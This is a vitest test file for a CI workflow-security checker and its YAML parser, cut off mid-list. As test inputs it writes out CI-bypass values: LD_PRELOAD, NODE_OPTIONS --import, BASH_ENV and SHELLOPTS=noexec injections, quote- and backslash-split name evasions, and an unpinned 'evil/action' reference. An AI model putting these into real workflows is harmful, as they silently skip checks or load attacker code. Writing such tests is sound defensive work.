// AT-12 (local part): scripts/check-workflows.mjs and its YAML-subset parser (spec §7.1, §7.2).
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import {
  DEPLOY_IF,
  BUILD_ONLY_ENV,
  ENV_ALLOW_LIST,
  PUBLIC_DEPLOY_ENV,
  REQUIRED_JOBS,
  YamlError,
  checkAction,
  checkWorkflow,
  parseYaml,
  runChecks,
  secretRefs,
} from '../check-workflows.mjs';
import { cleanupTempDirs, makeTempDir, writeFiles } from './fixtures/checks/temp-repo.mjs';

afterEach(cleanupTempDirs);

const fixture = (name) =>
  readFileSync(
    fileURLToPath(new URL(`./fixtures/checks/workflows/${name}`, import.meta.url)),
    'utf8',
  );
const CI = fixture('ci.yml');
const ACTION = fixture('setup-action.yml');
const SHA = '1111111111111111111111111111111111111111';
const ctx = { installActions: new Set(['.github/actions/setup']) };
const doc = () => parseYaml(CI);
// Each violation as the CLI prints it, so tests can match the file and location too.
const msgs = (v) =>
  v.map((x) => `${x.file}${x.where ? ` (${x.where})` : ''}: ${x.message}`).join('\n');

describe('parseYaml (the subset GitHub workflows use)', () => {
  it('reads nested mappings, sequences and scalars', () => {
    const y = [
      '# comment',
      'name: ci # trailing comment',
      'on:',
      '  push:',
      '    branches:',
      '    - main',
      "    - 'milestone/**'",
      'n: 0',
      't: true',
      'f: false',
      'e:',
      'url: https://example.invalid/a#b',
      'q: "a \\"quoted\\" \\u0041 # not a comment"',
      "s: 'it''s'",
      'list:',
      '  - a',
      '  - k: v',
      '    k2: v2',
      '  - - nested',
      '  -',
      '    deep: 1',
    ].join('\n');
    expect(parseYaml(y)).toEqual({
      name: 'ci',
      on: { push: { branches: ['main', 'milestone/**'] } },
      n: 0,
      t: true,
      f: false,
      e: null,
      url: 'https://example.invalid/a#b',
      q: 'a "quoted" A # not a comment',
      s: "it's",
      list: ['a', { k: 'v', k2: 'v2' }, ['nested'], { deep: 1 }],
    });
  });

  it('reads block scalars with chomping, keeping # lines as content', () => {
    const y = [
      'a: |',
      '  line 1',
      '  # not a comment',
      '',
      '    indented',
      'b: |-',
      '  x',
      'c: >',
      '  folded',
      '  text',
      '',
      '  para',
      'd: |+',
      '  keep',
      '',
      'e: end',
    ].join('\n');
    expect(parseYaml(y)).toEqual({
      a: 'line 1\n# not a comment\n\n  indented\n',
      b: 'x',
      c: 'folded text\npara\n',
      d: 'keep\n\n',
      e: 'end',
    });
  });

  it('reads flow collections, also across lines', () => {
    const y = [
      'needs: [a, "b", c]',
      'with: { x: 1, y: [p, q] }',
      'multi: [',
      '  one,',
      '  two,',
      ']',
    ];
    expect(parseYaml(y.join('\n'))).toEqual({
      needs: ['a', 'b', 'c'],
      with: { x: 1, y: ['p', 'q'] },
      multi: ['one', 'two'],
    });
  });

  it('folds a multi-line plain scalar', () => {
    expect(parseYaml("if: github.event_name == 'push' &&\n  github.ref == 'x'\nz: 1")).toEqual({
      if: "github.event_name == 'push' && github.ref == 'x'",
      z: 1,
    });
  });

  it('reads the fixture workflow', () => {
    const d = doc();
    expect(Object.keys(d.jobs)).toEqual([...REQUIRED_JOBS, 'deploy-staging']);
    expect(d.permissions).toEqual({ contents: 'read' });
    expect(d.jobs.static.steps[0].with['persist-credentials']).toBe(false);
    expect(d.jobs['deploy-staging'].if).toBe(DEPLOY_IF);
  });

  it.each([
    ['duplicate keys', 'a: 1\na: 2'],
    ['anchors', 'a: &x 1'],
    ['aliases', 'a: *x'],
    ['tags', 'a: !!str 1'],
    ['merge keys', 'b: {}\n<<: b'],
    ['tabs in indentation', 'a:\n\tb: 1'],
    ['bad indentation', 'a:\n    b: 1\n  c: 2'],
    ['an unterminated quote', 'a: "x'],
    ['an unterminated flow', 'a: [x, y'],
    ['multiple documents', 'a: 1\n---\nb: 2'],
    ['a complex key', '? a\n: b'],
  ])('rejects %s', (_label, y) => {
    expect(() => parseYaml(y)).toThrow(YamlError);
  });

  // S1.4 security review HIGH 2: a flow key or scalar starting with a YAML indicator is a real
  // key to GitHub/js-yaml (`&a uses` is the key `uses` with an anchor), so the gate must not read
  // it as a literal key or value.
  describe.each([
    ['&', '&a uses'],
    ['*', '*a'],
    ['!', '!!str continue-on-error'],
    ['?', '? uses'],
    ['|', '|'],
    ['>', '>'],
    ['%', '%x'],
    ['@', '@x'],
    ['`', '`x'],
  ])('a flow token starting with %s', (indicator, token) => {
    it('is rejected as a flow-mapping key', () => {
      expect(() => parseYaml(`steps:\n  - { name: T, ${token}: evil/action@main }`)).toThrow(
        YamlError,
      );
    });

    it('is rejected as a flow-mapping value', () => {
      expect(() => parseYaml(`step: { name: T, uses: ${token} }`)).toThrow(YamlError);
    });

    it('is rejected as a flow-sequence item', () => {
      expect(() => parseYaml(`needs: [static, ${token}]`)).toThrow(YamlError);
    });

    it('is rejected as a key of a mapping nested in a flow sequence', () => {
      expect(() => parseYaml(`steps: [{ name: T, ${token}: x }]`)).toThrow(YamlError);
    });

    it(`names the indicator in the error (${indicator})`, () => {
      expect(() => parseYaml(`a: { ${token}: x }`)).toThrow(/flow/);
    });
  });

  it('rejects an empty key in a flow mapping', () => {
    expect(() => parseYaml('a: { : x }')).toThrow(YamlError);
  });

  it('ends a flow plain scalar at a " #" comment, as YAML does', () => {
    expect(parseYaml('a: { k: v #c\n }\nb: [x #c\n ]')).toEqual({ a: { k: 'v' }, b: ['x'] });
  });

  // S1.4 security review LOW 7: YAML 1.1 parsers (js-yaml) treat these as line breaks, which
  // this line-based parser would not, so a file containing one is refused before parsing.
  it.each([
    ['a bare CR', 'a: 1\rcontinue-on-error: true\n'],
    ['U+0085', 'a: 1\u0085b: 2\n'],
    ['U+2028', 'a: 1\u2028b: 2\n'],
    ['U+2029', 'a: 1\u2029b: 2\n'],
  ])('rejects %s anywhere in the file', (_label, y) => {
    expect(() => parseYaml(y)).toThrow(/line break/);
  });

  it('still accepts CRLF line endings', () => {
    expect(parseYaml('a: 1\r\nb: 2\r\n')).toEqual({ a: 1, b: 2 });
  });
});

describe('checkWorkflow', () => {
  it('passes the fixture workflow and composite action', () => {
    expect(checkWorkflow(doc(), 'ci.yml', ctx)).toEqual([]);
    expect(checkAction(parseYaml(ACTION), 'action.yml')).toEqual([]);
  });

  it('passes a workflow without a deploy-staging job (S1.5 shape)', () => {
    const d = doc();
    delete d.jobs['deploy-staging'];
    expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
  });

  it.each([
    ['a tag', 'actions/checkout@v7'],
    ['a short SHA', 'actions/checkout@1111111'],
    ['a branch', 'actions/checkout@main'],
    ['no ref', 'actions/checkout'],
    ['an uppercase SHA', `actions/checkout@${SHA.replace(/1/g, 'A')}`],
    ['a docker tag', 'docker://alpine:3'],
  ])('rejects a uses: pinned to %s', (_label, ref) => {
    const d = doc();
    d.jobs.static.steps[0].uses = ref;
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/not pinned to a full commit SHA/);
  });

  it('accepts a docker image pinned by digest and a reusable workflow pinned by SHA', () => {
    const d = doc();
    d.jobs.extra = {
      'runs-on': 'ubuntu-24.04',
      steps: [{ uses: `docker://alpine@sha256:${'a'.repeat(64)}` }],
    };
    d.jobs.reuse = { uses: `org/repo/.github/workflows/x.yml@${SHA}` };
    expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
    d.jobs.reuse.uses = 'org/repo/.github/workflows/x.yml@v1';
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/jobs\.reuse.*not pinned/);
  });

  it.each([
    ['missing', undefined],
    ['read-all', 'read-all'],
    ['write-all', 'write-all'],
    ['broader', { contents: 'write' }],
    ['extra scope', { contents: 'read', 'id-token': 'write' }],
  ])('rejects workflow permissions that are %s', (_label, perms) => {
    const d = doc();
    if (perms === undefined) delete d.permissions;
    else d.permissions = perms;
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/permissions/);
  });

  it.each([
    ['write', { contents: 'write' }],
    ['another scope', { 'pull-requests': 'read' }],
    ['write-all', 'write-all'],
  ])('rejects job permissions broader than the workflow (%s)', (_label, perms) => {
    const d = doc();
    d.jobs.rls.permissions = perms;
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/jobs\.rls.*permissions/);
  });

  it('accepts narrower job permissions', () => {
    const d = doc();
    d.jobs.rls.permissions = { contents: 'none' };
    d.jobs.security.permissions = {};
    expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
  });

  it.each([
    ['missing', undefined],
    ['true', true],
    ['the string true', 'true'],
  ])('rejects checkout with persist-credentials %s', (_label, value) => {
    const d = doc();
    if (value === undefined) delete d.jobs.static.steps[0].with['persist-credentials'];
    else d.jobs.static.steps[0].with['persist-credentials'] = value;
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/persist-credentials: false/);
  });

  it('matches checkout case-insensitively, as GitHub resolves owner/repo names (S1.4 review L3)', () => {
    const d = doc();
    d.jobs.static.steps[0].uses = d.jobs.static.steps[0].uses.replace(
      'actions/checkout',
      'Actions/Checkout',
    );
    delete d.jobs.static.steps[0].with;
    const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
    expect(m).toMatch(/persist-credentials: false/);
    expect(m).toMatch(/jobs.static.*fetch-depth: 0/);
  });

  it('rejects a checkout with no with: block at all', () => {
    const d = doc();
    delete d.jobs.rls.steps[0].with;
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/persist-credentials/);
  });

  it.each([
    ['string', 'pull_request_target'],
    ['list', ['push', 'workflow_run']],
    ['mapping', { pull_request_target: { types: ['opened'] } }],
  ])('rejects dangerous triggers given as a %s', (_label, on) => {
    const d = doc();
    d.on = on;
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/pull_request_target|workflow_run/);
  });

  it.each([
    ['issue_comment', { issue_comment: { types: ['created'] } }],
    ['schedule', { push: null, schedule: [{ cron: '0 0 * * *' }] }],
    ['repository_dispatch', ['pull_request', 'repository_dispatch']],
    ['workflow_call', { push: null, workflow_call: null }],
  ])('rejects a trigger outside the §7.1 list (%s)', (label, on) => {
    const d = doc();
    d.on = on;
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(new RegExp(`trigger ${label}`));
  });

  // d1 §7.1: a manual deploy from d1/** and milestone/** proves staging before main moves
  // (build-notes §0, founder-queue walkthrough 2026-10-15, item 3). Which branch may deploy is
  // pinned by the deploy-staging if: (tested under "deploy-staging gate").
  it('allows the workflow_dispatch trigger, as a mapping, a list or a string', () => {
    for (const on of [
      { pull_request: null, push: { branches: ['main'] }, workflow_dispatch: null },
      ['pull_request', 'push', 'workflow_dispatch'],
      'workflow_dispatch',
    ]) {
      const d = doc();
      d.on = on;
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).not.toMatch(/trigger/);
    }
  });

  it('keeps the fixture on pull_request, push (main, milestone/**) and workflow_dispatch', () => {
    const d = doc();
    expect(Object.keys(d.on)).toEqual(['pull_request', 'push', 'workflow_dispatch']);
    expect(d.on.push.branches).toEqual(['main', 'milestone/**']);
  });

  it.each(['static', 'security', 'migrations'])(
    'requires fetch-depth: 0 on the checkout in %s',
    (job) => {
      const d = doc();
      delete d.jobs[job].steps[0].with['fetch-depth'];
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
        new RegExp(`jobs\\.${job}.*fetch-depth: 0`),
      );
      d.jobs[job].steps[0].with['fetch-depth'] = 1;
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/fetch-depth: 0/);
    },
  );

  // N10–N13 re-review P3: a required check must test the commit under review, not another ref/repo.
  it.each(
    ['static', 'rls', 'security', 'migrations'].flatMap((job) =>
      ['ref', 'repository', 'Ref', ' REPOSITORY '].map((key) => [job, key]),
    ),
  )('rejects actions/checkout in %s setting %j', (job, key) => {
    const d = doc();
    d.jobs[job].steps[0].with[key] = key.trim().toLowerCase() === 'ref' ? 'refs/heads/main' : 'x/y';
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
      new RegExp(`jobs\\.${job}.*may not set ref: or repository:`),
    );
  });

  it('rejects ref: on a later checkout step of a required job too', () => {
    const d = doc();
    d.jobs.rls.steps.push({
      uses: d.jobs.rls.steps[0].uses,
      with: { 'persist-credentials': false, ref: '${{ github.base_ref }}' },
    });
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
      /jobs\.rls\.steps\[\d+\].*may not set ref: or repository:/,
    );
  });

  it('requires static to set MIGRATIONS_BASE=origin/main (job or workflow env)', () => {
    const d = doc();
    delete d.jobs.static.env;
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/jobs\.static.*MIGRATIONS_BASE/);
    d.env.MIGRATIONS_BASE = 'origin/main';
    expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
    d.env.MIGRATIONS_BASE = 'main';
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/MIGRATIONS_BASE/);
  });

  it('allows environment: only on deploy-staging, since environments hold the staging secrets', () => {
    const d = doc();
    d.jobs.rls.environment = 'staging';
    d.jobs.security.environment = { name: 'staging' };
    const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
    expect(m).toMatch(/jobs\.rls.*environment/);
    expect(m).toMatch(/jobs\.security.*environment/);
  });

  it('rejects continue-on-error on a job or a step', () => {
    const d = doc();
    d.jobs.static['continue-on-error'] = true;
    d.jobs.rls.steps[2]['continue-on-error'] = '${{ always() }}';
    const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
    expect(m).toMatch(/jobs\.static.*continue-on-error/);
    expect(m).toMatch(/jobs\.rls\.steps\[2\].*continue-on-error/);
    const ok = doc();
    ok.jobs.static['continue-on-error'] = false;
    expect(checkWorkflow(ok, 'ci.yml', ctx)).toEqual([]);
  });

  it('rejects an if: on a required job, since a skipped job reports success', () => {
    const d = doc();
    d.jobs.migrations.if = "github.actor != 'x'";
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/jobs\.migrations.*if:/);
  });

  // S1.4 security re-review N1: a required job skipped through `needs:` also reports success.
  it.each([
    ['a string', 'changes'],
    ['a list', ['rls', 'changes']],
  ])('rejects a required job that needs a job that is not required (%s)', (_, needs) => {
    const d = doc();
    d.jobs.changes = {
      'runs-on': 'ubuntu-24.04',
      if: "github.event_name == 'push'",
      steps: [{ run: 'true' }],
    };
    d.jobs.static.needs = needs;
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/jobs\.static.*needs:.*changes/);
  });

  it('rejects a required job whose needs: is not a job id or a list of them', () => {
    const d = doc();
    d.jobs.static.needs = { job: 'rls' };
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/jobs\.static.*needs:/);
  });

  // S1.4 security re-review N3: a shell template such as 'true {0}' makes every run: step exit 0.
  it.each([
    [
      'a step',
      (d) => (d.jobs.static.steps[2].shell = 'true {0}'),
      /jobs\.static\.steps\[2\].*shell/,
    ],
    ['job defaults', (d) => (d.jobs.rls.defaults = { run: { shell: 'sh' } }), /jobs\.rls.*shell/],
    ['workflow defaults', (d) => (d.defaults = { run: { shell: 'true {0}' } }), /defaults.*shell/],
    ['a non-mapping defaults', (d) => (d.defaults = 'bash'), /defaults.*mapping/],
  ])('rejects a shell other than bash in %s', (_label, mutate, pattern) => {
    const d = doc();
    mutate(d);
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(pattern);
  });

  it('accepts shell: bash on a step and in job and workflow defaults', () => {
    const d = doc();
    d.jobs.static.steps[2].shell = 'bash';
    d.jobs.rls.defaults = { run: { shell: 'bash' } };
    d.defaults = { run: { shell: 'bash' } };
    expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
  });

  // S1.4 second re-review N9: bash reads SHELLOPTS (noexec), BASH_ENV, BASHOPTS and ENV from the
  // environment, so an env: entry can skip every run: step just like a shell template could.
  it.each([
    ['workflow env', (d) => (d.env = { SHELLOPTS: 'noexec' })],
    ['job env', (d) => (d.jobs.static.env = { ...d.jobs.static.env, BASH_ENV: './.ci/env.sh' })],
    ['step env', (d) => (d.jobs.rls.steps[2].env = { bashopts: 'x' })],
    ['an expression env key', (d) => (d.jobs.static.env = { "${{ 'SHELLOPTS' }}": 'noexec' })],
    ['ENV', (d) => (d.env = { ENV: './x.sh' })],
  ])('rejects a shell-startup variable in %s', (_label, mutate) => {
    const d = doc();
    mutate(d);
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/env: may not set/);
  });

  it.each([
    ['container', (d) => (d.jobs.static.container = 'ghcr.io/example/ci-image:latest')],
    ['services', (d) => (d.jobs.rls.services = { db: { image: 'postgres:17' } })],
  ])('rejects %s on a required job', (_label, mutate) => {
    const d = doc();
    mutate(d);
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/may not use container: or services:/);
  });

  // N10–N13 re-review P2: the image of a deploy-staging container (or service) decides which bash
  // runs the steps that hold the staging secrets, and its env:/options: escape checkEnv.
  it.each([
    [
      'container',
      (d) =>
        (d.jobs['deploy-staging'].container = {
          image: `node@sha256:${'a'.repeat(64)}`,
          options: '--env BASH_ENV=/x',
        }),
    ],
    [
      'services',
      (d) =>
        (d.jobs['deploy-staging'].services = {
          s: { image: 'postgres:17', env: { LD_PRELOAD: './x.so' } },
        }),
    ],
  ])('rejects %s on deploy-staging', (_label, mutate) => {
    const d = doc();
    mutate(d);
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
      /\(jobs\.deploy-staging\): a required job or deploy-staging may not use container: or services:/,
    );
  });

  // N10 made env: names fail closed, so CI_FLAG (accepted here before N10) now fails; the
  // ordinary names that pass are the ones on ENV_ALLOW_LIST.
  it('accepts an ordinary env: name such as DO_NOT_TRACK', () => {
    const d = doc();
    d.env = { DO_NOT_TRACK: '1' };
    d.jobs.static.env = { ...d.jobs.static.env, WRANGLER_SEND_METRICS: 'false' };
    expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
    d.jobs.static.env.CI_FLAG = 'yes';
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
      /jobs\.static\): env: may not set CI_FLAG.*ENV_ALLOW_LIST/,
    );
  });

  // S1.4 N8/N9 security review N10: a deny-list of four names missed every other variable that
  // bash, node, pnpm, the dynamic loader or the runner reads at startup (BASH_FUNC_pnpm%%,
  // NODE_OPTIONS and pnpm_config_script_shell each made run: steps exit 0 without running), so
  // only upper-case names on ENV_ALLOW_LIST pass, at every level.
  describe('env: names fail closed (N10)', () => {
    const REPRO_NAMES = [
      'BASH_FUNC_pnpm%%',
      'NODE_OPTIONS',
      'pnpm_config_script_shell',
      'LD_PRELOAD',
      'PATH',
      'ACTIONS_ALLOW_UNSECURE_COMMANDS',
    ];
    const WHOLE_ENV = `\${{ fromJSON('{"SHELLOPTS":"noexec"}') }}`;
    // [label, the node whose env: is set, where the violation is reported]
    const LEVELS = [
      ['workflow env', (d) => d, /ci\.yml \(env\): env: /],
      ['job env', (d) => d.jobs.static, /\(jobs\.static\): env: /],
      ['step env', (d) => d.jobs.rls.steps[2], /\(jobs\.rls\.steps\[2\]\): env: /],
      [
        'deploy-staging step env',
        (d) => d.jobs['deploy-staging'].steps[8],
        /\(jobs\.deploy-staging\.steps\[8\]\): env: /,
      ],
    ];
    const caseVariants = (name) => [
      ...new Set([
        name,
        name.toLowerCase(),
        name.toUpperCase(),
        name[0] + name.slice(1).toLowerCase(),
      ]),
    ];

    describe.each(REPRO_NAMES)('%s', (name) => {
      it.each(LEVELS)('is rejected in a %s', (_label, target, where) => {
        for (const variant of caseVariants(name)) {
          const d = doc();
          const t = target(d);
          t.env = { ...t.env, [variant]: 'x' };
          const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
          expect(m, variant).toMatch(new RegExp(`${where.source}may not set`));
          expect(m, variant).toContain(`may not set ${variant}`);
        }
      });

      it('is rejected in a composite-action step env', () => {
        for (const variant of caseVariants(name)) {
          const a = parseYaml(ACTION);
          a.runs.steps[2].env = { [variant]: 'x' };
          expect(msgs(checkAction(a, 'action.yml')), variant).toMatch(
            /action\.yml \(runs\.steps\[2\]\): env: may not set/,
          );
        }
      });
    });

    it.each([
      ['NODE_OPTIONS', 'node_options', /node reads/],
      ['BASH_FUNC_pnpm%%', 'bash_func_x%%', /bash imports/],
      ['pnpm_config_script_shell', 'PNPM_CONFIG_SCRIPT_SHELL', /pnpm and npm read/],
      ['npm_config_script_shell', 'Npm_Config_Script_Shell', /pnpm and npm read/],
      ['LD_PRELOAD', 'ld_preload', /dynamic loader/],
      ['PATH', 'Path', /which program/],
      ['ACTIONS_ALLOW_UNSECURE_COMMANDS', 'actions_allow_unsecure_commands', /runner reads/],
      ['SHELLOPTS', 'ShellOpts', /bash reads it at startup/],
    ])('names why %s is denied, in any case (%s)', (_name, variant, reason) => {
      const d = doc();
      d.env = { ...d.env, [variant]: 'x' };
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(reason);
    });

    it.each(LEVELS)('rejects a whole-env expression in a %s', (_label, target, where) => {
      const d = doc();
      target(d).env = WHOLE_ENV;
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
        new RegExp(`${where.source}must be a mapping`),
      );
    });

    it('rejects a whole-env expression in a composite-action step', () => {
      const a = parseYaml(ACTION);
      a.runs.steps[2].env = WHOLE_ENV;
      expect(msgs(checkAction(a, 'action.yml'))).toMatch(
        /runs\.steps\[2\]\): env: must be a mapping/,
      );
    });

    it.each([
      ['an empty env:', null],
      ['a list', ['SHELLOPTS=noexec']],
      ['a number', 1],
    ])('rejects an env: that is %s', (_label, value) => {
      const d = doc();
      d.jobs.static.steps[2].env = value;
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
        /jobs\.static\.steps\[2\]\): env: must be a mapping/,
      );
    });

    it.each([
      ['a listed name in lower case', 'do_not_track'],
      ['a name that is not listed', 'CI_FLAG'],
      ['a name with a hyphen', 'DO-NOT-TRACK'],
      ['a name starting with a digit', '1PASSWORD'],
      ['a name with a space', 'DO_NOT_TRACK '],
    ])('rejects %s', (_label, name) => {
      const d = doc();
      d.jobs.security.steps[2].env = { [name]: '1' };
      expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
        /jobs\.security\.steps\[2\]\): env: may not set/,
      );
    });

    it('keeps the allow-list to upper-case names from ci.yml, the setup action and spec §7.2/§7.3', () => {
      expect(Object.isFrozen(ENV_ALLOW_LIST)).toBe(true);
      for (const name of ENV_ALLOW_LIST) expect(name).toMatch(/^[A-Z][A-Z0-9_]*$/);
      expect([...ENV_ALLOW_LIST].sort()).toEqual(
        [
          // .github/workflows/ci.yml
          'DO_NOT_TRACK',
          'WRANGLER_SEND_METRICS',
          'MIGRATIONS_BASE',
          'OSV_SCANNER_VERSION',
          'OSV_SCANNER_SHA256',
          // .github/actions/setup/action.yml
          'GITLEAKS_VERSION',
          'GITLEAKS_SHA256',
          // the S3 deploy-staging job (spec §7.2, §7.3)
          'SUPABASE_STAGING_DB_URL',
          'CLOUDFLARE_API_TOKEN',
          'CLOUDFLARE_ACCOUNT_ID',
          // m0b: the staging build and the org sign-in smoke step (specs/m0b-tenancy.md §2.7, AT-B9)
          'VITE_SUPABASE_URL',
          'VITE_SUPABASE_PUBLISHABLE_KEY',
          'SUPABASE_STAGING_URL',
          'SUPABASE_STAGING_PUBLISHABLE_KEY',
          'STAGING_SMOKE_EMAIL',
          'STAGING_SMOKE_PASSWORD',
          'STAGING_SMOKE_TOTP_SECRET',
          // d1 AT-D22: the Sentry DSNs (public vars): the recruiter build and the jobs/api deploy
          'VITE_SENTRY_DSN',
          'SENTRY_DSN_WORKERS',
          // d1 §7.1 (review F4): the candidate-token public values, passed to the api and edge
          // Workers with --var from GitHub variables (never secrets) and checked first
          'CANDIDATE_TOKEN_KID',
          'CANDIDATE_TOKEN_PUBLIC_JWK',
        ].sort(),
      );
    });

    it('accepts every listed name at every level', () => {
      // the build-only names have their own rule (deploy build step only), tested below
      const all = Object.fromEntries(
        ENV_ALLOW_LIST.filter((n) => !Object.hasOwn(BUILD_ONLY_ENV, n)).map((n) => [n, 'x']),
      );
      const d = doc();
      d.env = { ...all, MIGRATIONS_BASE: 'origin/main' };
      d.jobs.static.env = { ...all, MIGRATIONS_BASE: 'origin/main' };
      d.jobs.rls.steps[2].env = { ...all };
      expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
      const a = parseYaml(ACTION);
      a.runs.steps[2].env = { ...all };
      expect(checkAction(a, 'action.yml')).toEqual([]);
    });
  });

  it('allows a required job to need only other required jobs', () => {
    const d = doc();
    d.jobs.static.needs = 'rls';
    d.jobs.security.needs = ['rls', 'migrations'];
    expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
  });

  // S1.4 security review MED 4: a required check must not be emptied.
  it.each(REQUIRED_JOBS)('rejects an if: on any step of the required job %s', (job) => {
    const d = doc();
    const last = d.jobs[job].steps.length - 1;
    d.jobs[job].steps[last].if = 'false';
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(
      new RegExp(`jobs\\.${job}\\.steps\\[${last}\\].*if:`),
    );
  });

  it('allows an if: on a step of a job that is not required', () => {
    const d = doc();
    d.jobs.extra = {
      'runs-on': 'ubuntu-24.04',
      steps: [{ if: "github.event_name == 'push'", run: 'echo hi' }],
    };
    expect(checkWorkflow(d, 'ci.yml', ctx)).toEqual([]);
  });

  it('rejects a job name: that differs from its id, and accepts one equal to it', () => {
    const d = doc();
    d.jobs.extra = { name: 'static', 'runs-on': 'ubuntu-24.04', steps: [{ run: 'true' }] };
    d.jobs.rls.name = 'RLS tests';
    const m = msgs(checkWorkflow(d, 'ci.yml', ctx));
    expect(m).toMatch(/jobs\.extra.*name:/);
    expect(m).toMatch(/jobs\.rls.*name:/);
    const ok = doc();
    ok.jobs.rls.name = 'rls';
    expect(checkWorkflow(ok, 'ci.yml', ctx)).toEqual([]);
  });

  it('rejects a job whose id differs from a required job only by case', () => {
    const d = doc();
    d.jobs.Static = { 'runs-on': 'ubuntu-24.04', steps: [{ run: 'true' }] };
    expect(msgs(checkWorkflow(d, 'ci.yml', ctx))).toMatch(/jobs\.Static.*required/);
  });

  // S3b security review, lead follow-up: run: text could set or export the names env: may not
  // set, and GITHUB_ENV / GITHUB_PATH carry a variable or a PATH entry into every later step.
  describe('run: text may not set denied names (S3b review gap)', () => {
    const esc = (s) => s.replace(/[$%]/g, '\\$&');
    const typecheck = (d) => d.jobs.static.steps[2];

    it.each([
      [
        'export',
        'export NODE_OPTIONS=--import=./x.mjs\npnpm typecheck',
        'NODE_OPTIONS',
        /node reads/,
      ],
      ['a command prefix', 'NODE_OPTIONS=--import=./x.mjs pnpm typecheck', 'NODE_OPTIONS', null],
      [
        'declare -x',
        'declare -x LD_PRELOAD=./x.so\npnpm typecheck',
        'LD_PRELOAD',
        /dynamic loader/,
      ],
      ['a quoted export', 'export "PATH=./bin:$PATH"\npnpm typecheck', 'PATH', /which program/],
      ['export of a read value', 'read -r BASH_ENV < x\nexport BASH_ENV', 'BASH_ENV', /bash reads/],
      ['a := expansion', ': "${NODE_OPTIONS:=--import=./x.mjs}"', 'NODE_OPTIONS', null],
      ['a = expansion', ': "${SHELLOPTS=noexec}"', 'SHELLOPTS', null],
      [
        'npm config',
        'npm_config_script_shell=true pnpm typecheck',
        'npm_config_script_shell',
        /pnpm and npm/,
      ],
      [
        'upper-case pnpm config',
        'PNPM_CONFIG_SCRIPT_SHELL=true pnpm test',
        'PNPM_CONFIG_SCRIPT_SHELL',
        null,
      ],
      [
        'a function import',
        "export BASH_FUNC_pnpm%%='() { :; }'",
        'BASH_FUNC_pnpm',
        /bash imports/,
      ],
      ['unset', 'unset PATH\npnpm typecheck', 'PATH', null],
      ['printf -v', 'printf -v ENV %s ./x.sh', 'ENV', null],
      [
        'a runner name',
        'ACTIONS_ALLOW_UNSECURE_COMMANDS=true pnpm test',
        'ACTIONS_ALLOW_UNSECURE_COMMANDS',
        /runner reads/,
      ],
      ['a workflow command', 'echo "::set-env name=NODE_OPTIONS::x"', 'NODE_OPTIONS', null],
      // Follow-up review (Medium): bash deletes a backslash-newline before parsing, even inside
      // a name or a ${...}, so the name is only whole after the lines are joined.
      ['a split export', 'export NO\\\nDE_OPTIONS=--import=x', 'NODE_OPTIONS', null],
      ['a split prefix', 'PA\\\nTH=/tmp/evil pnpm test', 'PATH', null],
      ['a split at the underscore', 'export BASH\\\n_ENV=/x', 'BASH_ENV', null],
      ['a split loader name', 'LD\\\n_PRELOAD=/x.so pnpm test', 'LD_PRELOAD', null],
      ['a split := expansion', ': "${NODE_OPTIONS:\\\n=x}"', 'NODE_OPTIONS', null],
      ['a CRLF split', 'export NO\\\r\nDE_OPTIONS=x', 'NODE_OPTIONS', null],
      // Follow-up review (Low): array-element defaults and quote or backslash splits.
      ['an array-element = expansion', ': "${NODE_OPTIONS[0]=x}"', 'NODE_OPTIONS', null],
      ['an array-element := expansion', ': "${PATH[0]:=x}"', 'PATH', null],
      ['a double-quote split', 'export NO"DE_OPTIONS=--import=x"', 'NODE_OPTIONS', null],
      ['a single-quote split', "export N'ODE_OPTIONS'=x", 'NODE_OPTIONS', null],
      ['a backslash split', 'export PA\\TH=/tmp', 'PATH', null],
      ['adjacent quoted halves', 'printf -v "PA""TH" %s x', 'PATH', null],
      // One case per deny class not covered above.
      ['a runner temp override', 'RUNNER_TEMP=/tmp/x pnpm test', 'RUNNER_TEMP', /runner reads/],
